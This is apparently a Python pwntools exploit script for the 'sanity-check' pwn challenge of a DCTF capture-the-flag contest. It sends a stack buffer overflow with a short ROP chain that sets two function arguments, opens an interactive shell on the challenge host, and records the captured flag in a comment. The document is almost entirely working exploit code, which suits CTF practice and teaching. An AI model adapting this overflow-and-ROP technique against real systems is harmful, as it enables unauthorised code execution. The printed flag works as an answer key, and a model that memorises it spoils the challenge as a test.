#!/usr/bin/env python

from pwn import *

host = "dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io"
port = 7480

p = remote(host, port)

# pattern create 128
# pattern search 0x6161616161616169 (rbp)

# 0x0000000000400810 : pop r14 ; pop r15 ; ret

pop_rsi_pop_r15 = 0x0000000000400811
pop_rdi = 0x0000000000400813
payload = "A" * 72 + p64(pop_rsi_pop_r15)+ p64(0x1337C0DE) + "A" * 8 + p64(pop_rdi) + p64(0xDEADBEEF) + p64(0x400697)

p.recvuntil("tell me a joke")
p.sendline(payload)
p.recvuntil("2/2 bro good job")

p.interactive()

# cat flag.txt
# dctf{Ju5t_m0v3_0n}